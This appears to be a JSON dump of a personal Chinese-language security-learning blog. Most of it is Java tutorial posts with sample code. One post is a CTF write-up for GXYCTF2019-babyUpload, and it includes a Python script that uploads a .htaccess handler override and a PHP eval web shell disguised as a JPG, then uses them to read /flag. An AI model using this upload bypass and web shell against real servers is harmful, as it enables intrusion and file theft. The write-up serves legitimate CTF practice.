{"meta":{"title":"冰冰的小屋","subtitle":"","description":"这是M0th的个人博客","author":"M0th","url":"http://M0th.top","root":"/"},"pages":[{"title":"关于","date":"2020-08-09T08:50:06.517Z","updated":"2020-08-09T08:50:06.517Z","comments":true,"path":"about/index.html","permalink":"http://m0th.top/about/index.html","excerpt":"","text":"一个网安web方向努力挣扎的菜狗"},{"title":"所有分类","date":"2020-08-07T03:02:53.795Z","updated":"2020-08-07T03:02:53.795Z","comments":true,"path":"categories/index.html","permalink":"http://m0th.top/categories/index.html","excerpt":"","text":""},{"title":"友链","date":"2021-03-27T06:11:47.487Z","updated":"2021-03-27T06:11:47.487Z","comments":true,"path":"friends/index.html","permalink":"http://m0th.top/friends/index.html","excerpt":"","text":""},{"title":"mylife","date":"2020-08-09T14:24:42.507Z","updated":"2020-08-09T14:24:42.507Z","comments":true,"path":"mylife/index.html","permalink":"http://m0th.top/mylife/index.html","excerpt":"","text":"关于M0th的日常札记 2020/8/8 ​ 去年就搭建起了自己的博客，可是一直以helloworld示人（说来惭愧），为了偷懒一直在csdn上写一些小笔记，今天打算开始使用自己的个人博客了，改了个主题，好好得配置一番，以后这就是我的小屋几啦！ 2020/8/9 ​ 今天做了一次从csdn上搬博客，太无聊，就搬了一部分，也不打算再搬了，就这样子吧，以后就都把学习笔记和wp传到这个博客里"},{"title":"所有标签","date":"2021-03-27T06:25:58.048Z","updated":"2020-08-07T03:00:41.594Z","comments":true,"path":"tags/index.html","permalink":"http://m0th.top/tags/index.html","excerpt":"","text":""},{"title":"","date":"2021-03-27T06:25:45.322Z","updated":"2020-08-07T03:00:21.017Z","comments":true,"path":"mylist/index.html","permalink":"http://m0th.top/mylist/index.html","excerpt":"","text":""}],"posts":[{"title":"java面向对象","slug":"java面向对象","date":"2021-04-11T09:35:26.000Z","updated":"2021-04-16T14:05:58.792Z","comments":true,"path":"2021/04/11/java面向对象/","link":"","permalink":"http://m0th.top/2021/04/11/java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/","excerpt":"","text":"初始面向对象面向对象 &amp; 面向过程面向过程 步骤清晰，顺序执行 面对过程适合处理一些较为简单的问题 面向对象 分类的思想木事，思考问题首先结局问题需要分成哪些类，然后对这些分类独立思考。分类下的细节还是通过面向过程的思索。 对于描述复杂的事物，为了从宏观上把握、从整体上合理分析，我们需要使用面向对象的思路来分析整个系统。但是，具体到微观操作，仍然需要面对过程的思路去处理 面向对象编程（Object-Oriented Programming, OOP）本质是：以类的方式组织代码，以对象的方式组织(封装)数据 面向对象三大特性： 封装、继承、多态 类是对象的模板，是对对象的抽象 类与对象的创建类是一种抽象的数据类型，它是对某一类事物整体描述/定义，但并不代表某一个具体的事物 对象是抽象概念的具体实例 使用new关键字来创建对象 使用new关键字创建的时候，除了分配内存空间，还会给创建好的对象进行默认的初始化以及对类中的构造器的调用 123456789101112131415package oop.demo01;//学生类public class Student &#123; //属性：字段 String name; int age; //方法 public void study()&#123; System.out.println(&quot;这是一个学生&quot;); &#125;&#125; 1234567891011121314151617181920212223package oop.demo01;//一个项目应该只有一个mian类public class Application &#123; public static void main(String[] args) &#123; //类:抽象的，实例化 //类实例化后会返回一个自己的对象 //student对象就是一个Student类的具体实例 Student xiaoming= new Student(); Student xh = new Student(); xiaoming.age =18; xiaoming.name = &quot;小明&quot;; System.out.println(xiaoming.name); System.out.println(xiaoming.age); xh.name = &quot;小红&quot;; xh.age =3; System.out.println(xh.name); System.out.println(xh.age); &#125;&#125; 构造器详解构造器也称为构造方法，是在创建对象的时候必须要调用的，有以下两个特点: 必须和类的名字相同 必须没有返回类型，也不能写void 作用： new本质在调用构造方法 初始化对象的属性值 注意点：定义了有参构造后，如果想使用无参构造，需要显示定义一个无参的构造器 快捷键：alt + insert 12345678910package oop.demo01;//一个项目应该只有一个mian类public class Application &#123; public static void main(String[] args) &#123; //new 实例化了一个对象 Person person = new Person(&quot;hahah&quot;); System.out.println(person.name); &#125;&#125; 123456789101112131415161718package oop.demo01;public class Person &#123; //一个类即使什么都不写，它也会存在一个构造方法 //显示的定义构造器 String name; //实例化初始值 //1.使用new关键字，本质在调用构造器 //2.用来初始化值 public Person()&#123; this.name = &quot;M0th&quot;; &#125; //有参构造，一旦定义了有参构造，无参就必须显示定义 public Person(String name) &#123; this.name = name; &#125;&#125; 创建对象简单内存分析12345678910package oop.demo02;public class Pet &#123; public String name; public int age; //无参构造 public void shout()&#123; System.out.println(&quot;叫了一声&quot;); &#125;&#125; 12345678910111213141516package oop;import oop.demo02.Pet;public class Application &#123; public static void main(String[] args) &#123; Pet dog = new Pet(); dog.name = &quot;旺财&quot;; dog.age = 3; dog.shout(); System.out.println(dog.name); System.out.println(dog.age); &#125;&#125;","categories":[{"name":"java学习之路","slug":"java学习之路","permalink":"http://m0th.top/categories/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/"}],"tags":[{"name":"java","slug":"java","permalink":"http://m0th.top/tags/java/"}]},{"title":"GXYCTF2019-babyUpload","slug":"GXYCTF2019-babyUpload","date":"2021-04-10T04:16:02.000Z","updated":"2021-04-10T09:54:47.599Z","comments":true,"path":"2021/04/10/GXYCTF2019-babyUpload/","link":"","permalink":"http://m0th.top/2021/04/10/GXYCTF2019-babyUpload/","excerpt":"简单的双文件上传，可以学习的地方在于如果用python实现脚本化","text":"简单的双文件上传，可以学习的地方在于如果用python实现脚本化 解题过程不断更改构造成这副样子即可绕过限制 我们还需要上传一个.htaccess实现解析，其原理查看http://m0th.top/2021/02/03/%E5%85%B3%E4%BA%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81bypass/ 脚本实现自动化根据主办方wp的写法，学习到了如何通过python脚本实现自动化文件上传 python的request库传文件 查了一下文档 123456789101112&gt;&gt;&gt; url = &#x27;http://httpbin.org/post&#x27;&gt;&gt;&gt; multiple_files = [ (&#x27;images&#x27;, (&#x27;foo.png&#x27;, open(&#x27;foo.png&#x27;, &#x27;rb&#x27;), &#x27;image/png&#x27;)), (&#x27;images&#x27;, (&#x27;bar.png&#x27;, open(&#x27;bar.png&#x27;, &#x27;rb&#x27;), &#x27;image/png&#x27;))]&gt;&gt;&gt; r = requests.post(url, files=multiple_files)&gt;&gt;&gt; r.text&#123; ... &#x27;files&#x27;: &#123;&#x27;images&#x27;: &#x27;data:image/png;base64,iVBORw ....&#x27;&#125; &#x27;Content-Type&#x27;: &#x27;multipart/form-data; boundary=3131623adb2043caaeb5538cc7aa0b3a&#x27;, ...&#125; 123456789101112131415import requestsdef getflag(url): session = requests.session() htaccess = &#123;&#x27;uploaded&#x27;:(&#x27;.htaccess&#x27;,&quot;SetHandler application/x-httpd-php&quot;,&#x27;image/jpeg&#x27;)&#125; res_hta=session.post(url,files=htaccess) files=&#123;&#x27;uploaded&#x27;:(&#x27;123.jpg&#x27;,&quot;&lt;script language=\\&quot;php\\&quot;&gt;eval($_POST[\\&#x27;M0th\\&#x27;]);&lt;/script&gt;&quot;,&#x27;image/jpeg&#x27;)&#125; res_jpg = session.post(url,files=files) #print(res_jpg.text) res_shell=session.post(url+res_jpg.text[-69:-22],data=&#123;&#x27;M0th&#x27;:&#x27;echo file_get_contents(\\&#x27;/flag\\&#x27;);&#x27;&#125;) print(res_shell.text)if __name__==&quot;__main__&quot;: url=&quot;http://1be2d1cb-e5a9-475e-a280-95bb5d7368be.node3.buuoj.cn/&quot; getflag(url)","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"双文件上传","slug":"双文件上传","permalink":"http://m0th.top/tags/%E5%8F%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"java基础语法(二)","slug":"java基础语法-二","date":"2021-04-06T13:05:24.000Z","updated":"2021-04-11T09:30:59.871Z","comments":true,"path":"2021/04/06/java基础语法-二/","link":"","permalink":"http://m0th.top/2021/04/06/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-%E4%BA%8C/","excerpt":"java的简单的用户交互、方法、流程控制、数组等基础知识","text":"java的简单的用户交互、方法、流程控制、数组等基础知识 用户交互Scannerjava.util.Scanner 是JAVA5开始的特性，可以通过Scanner类来获取用户的输入 Scanner s =new Scanner(System.in); 通过Scanner类的 next() 和 nextLine() 方法获取输入的字符串 用 hasNext() 和 hasNextLine() 判断是否还有输入的数据 next()与nextLine()区别 next() 一定要读取到有效字符串后才可以结束输入 对输入有效字符之前遇到的空白，next()方法会自动将其去掉 只有输入有效字符后才将其后面的空白作为分隔符或者结束符 next()方法不能得到带有空格的字符串 123456789101112131415161718package scanner;import java.util.Scanner;public class Demo01 &#123; public static void main(String[] args) &#123; //从键盘接收数据 Scanner scanner =new Scanner(System.in); System.out.println(&quot;使用next方式接收:&quot;); //判断是否还有输入 if(scanner.hasNext())&#123; String str= scanner.next(); System.out.println(&quot;输出的内容&quot;+str); &#125; //凡是属于IO流的类如果不关闭会一直占用资源，用完就关掉 scanner.close(); &#125;&#125; nextLine() 以Enter为结束符，也就是说 nextLine()方法返回的是输入回车之前的所有字符 可以获得空白 1234567891011121314package scanner;import java.util.Scanner;public class Demo02 &#123; public static void main(String[] args) &#123; Scanner scanner = new Scanner(System.in); if(scanner.hasNext())&#123; String str = scanner.nextLine(); System.out.println(str); &#125; scanner.close(); &#125;&#125; scanner输入一些数字类型 123456789101112131415161718192021222324252627282930package scanner;import java.util.Scanner;public class Demo04 &#123; public static void main(String[] args) &#123; Scanner scanner = new Scanner(System.in); //从键盘接收数据 int i = 0; float f = 0.0F; System.out.println(&quot;请输入整数:&quot;); if(scanner.hasNextInt())&#123; i = scanner.nextInt(); System.out.println(&quot;整数数据:&quot;+i ); &#125;else&#123; System.out.println(&quot;输入的不是整数数据&quot;); &#125; System.out.println(&quot;请输入小数:&quot;); if(scanner.hasNextFloat())&#123; f =scanner.nextFloat(); System.out.println(&quot;小数数据:&quot;+f); &#125;else&#123; System.out.println(&quot;输入的不是小数数据&quot;); &#125; scanner.close(); &#125;&#125; 1234567891011121314151617181920package scanner;import java.util.Scanner;public class Demo05 &#123; public static void main(String[] args) &#123; //我们可以输入多个数字，并求其总和与平均数，每输入一个数字用回车确认，通过输入非数字来结束输入并输出执行结果： Scanner scanner = new Scanner(System.in); double sum =0; int m= 0; // 通过循环判断是否还有输入，并在里面对每一次进行求和和统计 while(scanner.hasNextDouble())&#123; double x = scanner.nextDouble(); m = m+1; sum = sum +x; System.out.println(&quot;你输入了第&quot;+m+&quot;个数据，然后当前结果和为sum=&quot;+sum); &#125; System.out.println(m+&quot;个数的平均值是&quot;+sum/m); scanner.close(); &#125;&#125; 结构 顺序结构最基本的结构，没啥好说的，一行一行执行而已 1234567891011package struct;public class Demo01 &#123; public static void main(String[] args) &#123; System.out.println(&quot;hello world&quot;); System.out.println(&quot;hello world&quot;); System.out.println(&quot;hello world&quot;); System.out.println(&quot;hello world&quot;); System.out.println(&quot;hello world&quot;); &#125;&#125; 选择结构 if 单选择结构 if(布尔表达式){ ​ //如果布尔表达式为true将执行的语句 } if双选择结构 if(布尔表达式){ ​ //如果布尔表达式的值为true }else{ ​ //如果布尔表达式的值为false } if多选择结构 if(布尔表达式 1){ ​ //如果布尔表达式1 的值为 true }else if(布尔表达式 2){ ​ //如果布尔表达式 2的值为 true }else if(布尔表达式 3){ ​ //如果布尔表达式 3的值为 true }else{ ​ //如果以上布尔表达式都不为true 则执行 } switch 多选择结构 byte、short、int 或 char 从 Java SE 7开始switch 支持字符串String 类型 同时case 标签必须为字符串常量 1234567891011121314151617package struct;public class Demo05 &#123; public static void main(String[] args) &#123; String name = &quot;狂神&quot;; switch(name)&#123; case &quot;M0th&quot;: System.out.println(&quot;M0th&quot;); break; case &quot;狂神&quot;: System.out.println(&quot;狂神&quot;); break; default: System.out.println(&quot;无了无了&quot;); &#125; &#125;&#125; 通过反编译发现，这个特性本身是将字符串转成hashcode然后做正常switch操作、 循环结构while循环 while(布尔表达式){ ​ //循环内容 } 123456789101112131415package struct;public class Demo07 &#123; public static void main(String[] args) &#123; //输出 1-100 int i =0; int sum=0; while(i&lt;100)&#123; sum=i+sum; i++; &#125; System.out.println(sum); &#125;&#125; do…while循环至少循环一次 do{ ​ //代码语句 }while(布尔表达式) 1234567891011121314151617package struct;public class Demo09 &#123; public static void main(String[] args) &#123; int a = 0; while(a&lt;0)&#123; System.out.println(a); a --; &#125; System.out.println(&quot;============&quot;); do&#123; System.out.println(a); a++; &#125;while(a&lt;0); &#125;&#125; for 循环for循环语句是支持迭代的一种通用结构，是最有效、最灵活的循环结构 for循环执行的次数是执行前就确定的 for(初始化; 布尔表达式; 更新){ ​ //代码语句 } 1234567891011121314151617package struct;//分别求100以内奇数和偶数的和public class Demo10 &#123; public static void main(String[] args) &#123; int oddSum=0; int evenSum= 0; for(int i = 0;i&lt;100;i++)&#123; if(i%2!=0)&#123; //奇数 oddSum+=i; &#125;else&#123; //偶数 evenSum+=i; &#125; &#125; System.out.println(&quot;奇数的和:&quot;+ oddSum); System.out.println(&quot;偶数的和:&quot;+evenSum); &#125;&#125; 1234567891011121314151617package struct;public class Demo11 &#123; public static void main(String[] args) &#123; // 用while 或者 for循环输出1-1000之间能被5整除的数字，每行三个 for(int i =0; i&lt;=1000;i++)&#123; if(i%5==0)&#123; System.out.print(i+&quot;\\t&quot;); &#125; if(i%15==0)&#123; System.out.println(&quot;\\n&quot;); &#125; &#125; //println 输出完换行 //print 输出完不换行 &#125;&#125; 123456789101112131415161718192021222324package struct;public class Demo12 &#123; public static void main(String[] args) &#123; for (int j = 1; j &lt;= 9; j++) &#123; for (int i = 1; i &lt;= j; i++) &#123; System.out.print(j+&quot;*&quot;+i+&quot;=&quot;+(j*i)+&quot;\\t&quot;); &#125; System.out.println(); &#125; /*1*1=1 2*1=2 2*2=4 3*1=3 3*2=6 3*3=9 4*1=4 4*2=8 4*3=12 4*4=16 5*1=5 5*2=10 5*3=15 5*4=20 5*5=25 6*1=6 6*2=12 6*3=18 6*4=24 6*5=30 6*6=36 7*1=7 7*2=14 7*3=21 7*4=28 7*5=35 7*6=42 7*7=49 8*1=8 8*2=16 8*3=24 8*4=32 8*5=40 8*6=48 8*7=56 8*8=64 9*1=9 9*2=18 9*3=27 9*4=36 9*5=45 9*6=54 9*7=63 9*8=72 9*9=81 */ &#125;&#125; 增强for循环增强for循环只是一种语法糖而已 for(声明语句: 表达式){ ​ //代码句子 } 1234567891011121314package struct;public class Demo13 &#123; public static void main(String[] args) &#123; int[] numbers=&#123;11,22,33,44,55&#125;; for (int i = 0; i &lt; 5; i++) &#123; System.out.println(i); &#125; System.out.println(&quot;=======================================&quot;); for(int x:numbers)&#123; System.out.println(x); &#125; &#125;&#125; break、continue、关于goto break 在任何语句的主体部分，均可以用break控制循环的流程。break 用于强行退出循环，不执行循环中剩余的语句。 coutinue语句用于循环语句体部分，用于终止某次循环，跳过循环中未执行的语句 goto是java的一个保留字，但是并没有在语言中正式使用，java没有goto 然而在break和continue关键字上我们可以看出一些goto的影子 “标签”是指后面跟一个冒号的标识符，例如 label： 对于java来说唯一用到标签的地方是在循环语句之前。我们希望在其中嵌套另一个循环，由于break和continue只是终止当前循环，但是若随同标签使用，它们就会中断到存在标签的地方 12345678910111213141516package struct;public class Demo14 &#123; public static void main(String[] args) &#123; int count=0; outer:for(int i =101;i&lt;150;i++)&#123; for(int j=2 ;j&lt;i/2;j++)&#123; if(i%j==0)&#123; continue outer; &#125; &#125; System.out.print(i+&quot; &quot;); &#125; &#125;&#125; 一个小练习打印一个三角形 12345678910111213141516171819package struct;public class Demo15 &#123; public static void main(String[] args) &#123; for (int i = 0; i &lt; 5; i++) &#123; for(int j = 5;j&gt;i;j--)&#123; System.out.print(&quot; &quot;); &#125; for(int j=0;j&lt;=i;j++)&#123; System.out.print(&quot;*&quot;); &#125; for(int j=0;j&lt;i;j++)&#123; System.out.print(&quot;*&quot;); &#125; System.out.println(); &#125; &#125;&#125; 方法方法的定义和调用java方法是语句的集合，它们在一起执行一个功能 方法是解决一类问题的步骤的有序组合 方法包含于类和对象中 方法在程序中被创建，在其他地方被引用 方法的原子性：一个方法只完成一个功能，这样有利于我们的拓展 方法的命名规则，首单词首字母小写后面遵循驼峰原则 方法包含一个方法头和一个方法体 修饰符：修饰符，可选，定义了方法的访问类型 返回值类型： 方法可能会有返回值，returnValueType ，但是有些方法没有返回值，此时returnValueType为void 方法名：方法的实际名称，方法名和参数表共同构成方法签名 参数类型：参数像一个占位符，当方法被调用时，传递给参数 形式参数：在方法被调用时用于接受外界输入的数据 实参：调用方法时实际传给方法的数据 方法体：方法体包含具体的语句，定义了该方法的功能 修饰符 返回值类型 方法名(参数类型 参数名){ 方法体 … return 返回值； } 1234567891011121314151617181920212223242526package method;public class Demo01 &#123; public static void main(String[] args) &#123; int sum =add(1,3); System.out.print(sum); Demo01 demo01= new Demo01(); demo01.test(); &#125; public static int add(int a ,int b)&#123; return a+b; &#125; public void test()&#123; for (int i = 0; i &lt;= 1000; i++) &#123; if(i%5==0)&#123; System.out.print(i+&quot;\\t&quot;); &#125; if(i%15==0)&#123; System.out.println(); &#125; &#125; &#125;&#125; 方法的重载重载就是在一个类中，有相同的函数名称，但是形参不同的函数 方法的重载规则： 方法名必须相同 参数列表必须不同（个数不同、类型不同、参数排列顺序不同） 返回值的类型可以相同也可以不同 仅仅返回值的类型不同不足以成为方法的重载 1234567891011121314151617181920212223242526272829303132333435package method;public class Demo02 &#123; public static void main(String[] args) &#123; double max = max(10,20.0); System.out.println(max); &#125; public static double max(double num1, double num2)&#123; double result=0; if(num1==num2)&#123; System.out.println(&quot;num1==num2&quot;); return 0; &#125; if(num1&gt;num2)&#123; result = num1; &#125;else&#123; result= num2; &#125; return result; &#125; public static int max(int num1, int num2)&#123; int result=0; if(num1==num2)&#123; System.out.println(&quot;num1==num2&quot;); return 0; &#125; if(num1&gt;num2)&#123; result = num1; &#125;else&#123; result= num2; &#125; return result; &#125;&#125; 命令行传参可以通过命令行参数传递给main()函数实现 123456789package method;public class Demo03 &#123; public static void main(String[] args) &#123; for (int i = 0; i &lt;args.length ; i++) &#123; System.out.println(&quot;args[&quot;+i+&quot;]:&quot;+args[i]); &#125; &#125;&#125; 可变参数JDK 1.5开始，java开始支持传递同类型的可变参数给一个方法 在方法声明中，在指定参数类型后面加一个省略号(…) 一个方法只能指定一个可变参数，它必须是方法的最后一个参数，任何普通的参数必须在它之前声明 12345678910111213141516171819202122package method;public class Demo04 &#123; public static void main(String[] args) &#123; Demo04 demo04 =new Demo04(); demo04.printMax(12,122,43334,23423.446,5463.346); &#125; public static void printMax(double ... numbers)&#123; if(numbers.length==0)&#123; System.out.println(&quot;没有什么东西可比较呢&quot;); &#125; double result = numbers[0]; for (int i = 0; i &lt;numbers.length ; i++) &#123; if(numbers[i]&gt;result)&#123; result = numbers[i]; &#125; &#125; System.out.println(result); &#125;&#125; 递归递归就是：A方法调用A方法！就是自己调用自己 递归包含两部分： 递归头：什么时候不调用自身方法。如果没有头，将会陷入死循环 递归体：什么时候需要调用自身方法 我们来解决一个10阶的汉诺塔问题 12345678910111213141516171819202122package method;public class Demo06 &#123; static int c =1; public static void main(String[] args) &#123; Demo06 demo06 =new Demo06(); demo06.hanNo(10,&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;); &#125; public static void move(int n, char a,char b)&#123; System.out.println((c++)+&quot;步\\t第&quot;+n+&quot;块从&quot;+a+&quot;移动到&quot;+b); &#125; public void hanNo(int n,char x,char y,char z)&#123; if(n==1)&#123; move(1,x,z); &#125;else&#123; hanNo(n-1,x,z,y); move(n,x,z); hanNo(n-1,y,x,z); &#125; &#125;&#125; 数组数组时相同类型数据的有序集合 数组的声明创建以及初始化必须先声明数组变量，才能在程序中使用数组。 dataType[] arrayRefVar; Java使用 new操作符来创建数组 dataType[] arrayRefVar = new dataType[arraySize]; 数组的元素是通过索引访问的，数组索引从 0 开始 获取数组长度 arrays.length 1234567891011package array;public class Demo01 &#123; public static void main(String[] args) &#123; int[] nums; //建议使用上面的方式 //int nums2[]; //下面这种只是早年为了让c和c++程序员适应java来设计的 nums = new int[10]; nums[1] = 2; nums[2] = 3; &#125;&#125; java内存初步 三种初始化 静态初始化 12int[] a= &#123;1,2,3&#125;;Man[] mans = &#123;new Man(1,1),new Man(1,1)&#125;; 根据赋值的量的长度来决定初始化数组的长度 动态初始化 123int [] a = new int[2];a[0] = 1;a[1] = 2; 先根据预定大小初始化数组长度，再赋值 默认初始化 数组时引用类型，他的元素相当于实例变量，因此数组一经分配空间，其中的每个元素也被按照实例变量同样的方式被隐式初始化 1234567891011121314package array;public class Demo02 &#123; public static void main(String[] args) &#123; int[] a = &#123;1,2,3,4,5,6,7,8&#125;; System.out.println(a[0]); int[] b = new int[10]; b[0] = 10; System.out.println(b[0]); System.out.println(b[1]); &#125;&#125; 数组的四个基本特点 长度确定，数组一旦被创建，他的大小就是不可改变的 其元素必须是相同类型，不允许混合类型 数组的元素可以是任何数据类型，包括基本类型和引用类型 数组本身就是对象，数组的每一个元素相当于该对象的成员变量，Java中对象存在堆中，所以数组对象也存在堆中 数组边界，以及越界报错1234public static void main(String[] args)&#123; int [] a =new int[2]; System.out.println(a[2]);&#125; java.lang.ArrayIndexOutOfBoundsException: Index 2 out of bounds for length 2 ArrayIndexOutOfBoundsException:数组下标越界异常！ 数组的使用For-Each循环写增强型for循环吧 12345678910111213141516171819202122232425package array;public class Demo05 &#123; public static void main(String[] args) &#123; int[] arrays = &#123; 1,2,3,4,5&#125;; for(int array:arrays)&#123; System.out.println(array); &#125; System.out.println(&quot;=======================&quot;); int sum= 0; for(int array:arrays)&#123; sum+=array; &#125; System.out.println(&quot;sum=&quot;+sum); System.out.println(&quot;========================&quot;); int max = 0; for(int array:arrays)&#123; if(array&gt;max)&#123; max=array; &#125; &#125; System.out.println(&quot;max=&quot;+max); &#125;&#125; 数组作为方法入参或者作为返回值123456789101112131415161718192021222324package array;public class Demo06 &#123; public static void main(String[] args) &#123; int[] arrays = &#123;1,2,3,4,5&#125;; int[] reverse = reverse(arrays); printArray(reverse); &#125; //打印 public static void printArray(int[] arrays)&#123; for (int i = 0; i &lt;arrays.length ; i++) &#123; System.out.println(arrays[i]+&quot; &quot;); &#125; &#125; //反转 public static int[] reverse(int[] arrays)&#123; int [] result = new int[arrays.length]; for (int i = 0,j=result.length -1; i &lt;arrays.length ; i++,j--) &#123; result[i] = arrays[j]; &#125; return result; &#125;&#125; 多维数组多维数组可以看成数组的数组，每一个元素都是一个一维数组 1int a[][]= new int[2][5] //可以得到一个两行5列的数组 12345678910111213package array;public class Demo07 &#123; public static void main(String[] args) &#123; int[][] array = &#123;&#123;1, 2&#125;, &#123;2, 3&#125;, &#123;3, 4&#125;, &#123;4, 5&#125;&#125;; for (int i = 0; i &lt; array.length; i++) &#123; for (int j = 0; j &lt; array[i].length; j++) &#123; System.out.println(array[i][j]); &#125; &#125; &#125;&#125; Arrays类数组的工具类java.util.Arrays 由于数组对象本身没有什么方法可以调用但是在javaAPI中提供了一个工具类Arrays供我们使用，通过这个工具类可以对数据对象进行一些基本操作 详细使用参考JDK帮助文档 Arrays类中的方法都是静态方法可以直接使用类名来调用，不用使用实例化对象的方式调用 常用功能： 给数组赋值：通过fill方法 给数组排序: 通过sort方法，按照升序 比较数组：通过equals方法比较数组中元素值是否相等 查找数组元素：通过 binarySearch方法对排序好的数组进行二分查找工作 1234567891011121314151617181920212223242526272829package array;import java.util.Arrays;public class Demo08 &#123; public static void main(String[] args) &#123; int[] a = &#123;1,133,4,5,2,5334,656,7,8,9134234,45645&#125;; System.out.println(a); //[I@7c30a502 //打印数组元素 //System.out.println(Arrays.toString(a)); Arrays.sort(a); Arrays.fill(a,123); Arrays.fill(a,2,4,0); System.out.println(Arrays.toString(a)); &#125; public static void printArray(int[] a)&#123; for (int i = 0; i &lt; a.length ; i++) &#123; if(i==0)&#123; System.out.println(&quot;[&quot;); &#125; if(i == a.length-1)&#123; System.out.println(a[i]+&quot;]&quot;); &#125; System.out.println(a[i]+&quot;,&quot;); &#125; &#125;&#125; 常用实例冒泡排序12345678910111213141516171819202122232425262728293031package array;import java.util.Arrays;public class Demo09 &#123; public static void main(String[] args) &#123; int [] a=&#123;1,23,4,6,34,74,342233,345345,7453,5645,7,8&#125;; Demo09 b =new Demo09(); int[] c=b.sort(a); System.out.println(Arrays.toString(c)); &#125; //比较数组中，两个相邻的元素，如果第一个数比第二个数大，交换位置 //每一次比较都会产生一个最大或者最小的数字 //下一轮可以少一次比较 //一次循环，直到结束 public int[] sort(int[] a)&#123; int tmp = 0; for (int i = 0; i &lt;a.length-i ; i++) &#123; for (int j = 0; j &lt;a.length -1-i ; j++) &#123; if(a[j]&gt;a[j+1])&#123; tmp = a[j]; a[j]=a[j+1]; a[j+1]=tmp; &#125; &#125; &#125; return a; &#125;&#125; 稀疏数组如果二维数组中很多默认值都是零，那么很多记录本身是没有意义的数据 解决方法：稀疏数组 本身算是一种压缩算法 稀疏数组的处理方式是： 记录数组一共有多少行多少列，有多少不同值 把具有不同值的元素和行列以及值存储到一个小规模数组中，从而实现压缩的目的 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970package array;public class Demo10 &#123; public static void main(String[] args) &#123; int [][] array1 = new int[11][11]; array1[1][2] = 1; array1[2][3] = 2; //输出一下原始数据 System.out.println(&quot;输出原始数组======================&quot;); for (int[] a: array1 ) &#123; for(int anInt: a)&#123; System.out.print(anInt+&quot;\\t&quot;); &#125; System.out.println(); &#125; //记录一下有效值的个数 int sum =0 ; for (int i = 0; i &lt;array1.length ; i++) &#123; for (int j = 0; j &lt;array1[i].length ; j++) &#123; if(array1[i][j]!=0)&#123; sum ++; &#125; &#125; &#125; System.out.println(&quot;有效记录值为&quot;+sum); //创建一个稀疏数组的数组,并且赋值 int[][] array2 = new int[sum+1][3]; array2[0][0] = array1.length; array2[0][1] = array1[0].length; array2[0][2] = sum; int count = 0; for (int i = 0; i &lt;array1.length ; i++) &#123; for (int j = 0; j &lt;array1[i].length ; j++) &#123; if(array1[i][j]!=0)&#123; count++; array2[count][0]=i; array2[count][1]=j; array2[count][2]=array1[i][j]; &#125; &#125; &#125; //输出稀疏数组 System.out.println(&quot;稀疏数组===============&quot;); for (int[] a: array2) &#123; for (int anInt: a) &#123; System.out.print(anInt+&quot;\\t&quot;); &#125; System.out.println(); &#125; // 还原回常规数组 System.out.println(&quot;还原成常规数组===============&quot;); int[][] array3= new int[array2[0][0]][array2[0][1]]; for (int i = 1; i &lt; sum+1; i++) &#123; array3[array2[i][0]][array2[i][1]]=array2[i][2]; &#125; for (int[] a:array3) &#123; for(int anInt: a)&#123; System.out.print(anInt+&quot;\\t&quot;); &#125; System.out.println(); &#125; &#125;&#125;","categories":[{"name":"java学习之路","slug":"java学习之路","permalink":"http://m0th.top/categories/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/"}],"tags":[{"name":"java","slug":"java","permalink":"http://m0th.top/tags/java/"}]},{"title":"java基础语法","slug":"java基础语法","date":"2021-03-28T14:27:37.000Z","updated":"2021-04-10T12:50:06.766Z","comments":true,"path":"2021/03/28/java基础语法/","link":"","permalink":"http://m0th.top/2021/03/28/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/","excerpt":"","text":"注释注释是一种非常好的习惯 单行注释 // 多行注释 123/*hahahaha*/ 文档注释 1234/** * @Description HelloWorld * @Author M0th */ 标识符和关键字关键字 Java所有的组成部分都需要名字。类名、变量名以及方法名都被称为标识符 所有的标识符都应该以字母（A-Z或者a-z），美元符($)、或者下划线(_)开始 首字母之后可以是字母，美元符，下划线，数字的任何字符组合 不能以关键字作为变量名或者方法名 标识符是大小写敏感的 可以中文命名。但是low 数据类型 强类型语言：要求变量的使用要求严格符合规定，所有变量都必须定义后使用 弱类型语言： 某一个变量被定义类型,该变量可以根据环境变化自动进行转换,不需要经过显性强制转换 java是一种强类型的语言，php、javascript是一种弱类型语言 java的数据类型氛围两类，基本类型与引用类型 除了基本类型之外全是引用类型 12345678910111213141516171819202122232425public class Demo02 &#123; public static void main(String[] args) &#123; //八大基本数据类型 //整数 int num1=10; //大小为 -2137483648-2147483647 byte num2=20; // 大小为 -128-127 short num3 = 30; //-32768-32767 long num4 = 30L; //Long类型要在数字后面加L -9223372036854775808-9223372036854775807 //小数： 浮点数 float num5 =50.1F; //float类型要在数字后面加F,4个字节 double num6=1.12334; //8个字节 //字符 char name =&#x27;郭&#x27;; //两个字节 //字符串,String 不是关键字,是类,所以String类型是引用数据类型 //String namea =&quot;M0th“; //bool值 boolean flag =true; //占一位 boolean flag1 =false; &#125;&#125; 拓展 数据类型应用 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162public class Dome03 &#123; public static void main(String[] args) &#123; // 整数拓展： 进制 二进制 十进制 八进制 十六进制 int i=11; int i2=011; int i3=0x11; System.out.println(i); System.out.println(i2); System.out.println(i3); //============================================================ //浮点数拓展？银行业务怎么表示，比如说钱 //============================================================ //有限 舍入误差 离散 大约 接近但是不等于 //double //不能使用浮点数用于比较 float f =0.1f; double d =0.1; System.out.println(f==d); //false float d1= 123456787654356786543f; float d2=d1+1; System.out.println(d1==d2); //true //============================================================ //字符拓展 //============================================================ char c1 = &#x27;a&#x27;; char c2 = &#x27;中&#x27;; System.out.println(c1); System.out.println((int)c1); System.out.println(c2); System.out.println((int)c2); //所有的字符本质还是数字 //编码 Unicode表： 97=a 65=A 2个字节 0-65536 E //U0000 UFFFF char 